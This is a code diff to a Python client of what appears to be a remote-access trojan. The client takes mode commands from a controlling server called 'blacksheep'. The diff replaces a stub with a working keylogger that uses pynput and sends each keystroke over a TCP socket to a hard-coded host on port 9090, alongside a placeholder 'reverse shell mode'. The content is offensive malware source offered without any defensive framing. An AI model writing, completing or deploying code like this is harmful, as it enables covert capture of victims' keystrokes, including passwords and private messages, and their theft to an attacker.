@@ -1,12 +1,13 @@
 from keyboard import *
 import socket
 from time import sleep
-import pyautogui
+from pynput.keyboard import Listener, Key
+from colorama import Fore, Back
 
 class Client:
 #client code starts here:
     def __init__(self):
-        self.host = "172.17.105.160"
+        self.host = "192.168.43.150"
         self.port = 9090
         self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
@@ -32,7 +33,11 @@ class Client:
         if self.data_from_blacksheep == "2":
             #keylogger codes goes here
             print("KEYLOGGER MODE ACTIVATED")
-            self.keylogger()
+            with Listener(on_press=self.on_press) as listener:
+                try:
+                    listener.join()
+                except KeyboardInterrupt as err:
+                    print("You closed the connection", err)
         if self.data_from_blacksheep == "3":
             #screen reverse shell goes here
             print("REVERSE SHELL MODE ACTIVATED")
@@ -70,10 +75,18 @@ class Client:
         self.route.close()
 
     #keylogger codes goes here 
-    def keylogger(self):
-        print("more codes will go bellow")
-        self.route.close()
+    def on_press(self, key):
+        try:
+            self.key_str = str(key)
+            self.msg = f">> {self.key_str}".encode("utf-8")
+            self.route.send(self.msg)
+            print(f"Sent >> {self.msg}")
+            print()
+        except Exception as e:
+            print(Fore.RED, Back.BLACK, f"Error: {e}")
 
+        print(Fore.GREEN, "Connection established: ")
+        
     #screen reverse shell goes here
     def reverse_shell(self):
         print("more codes will go bellow")
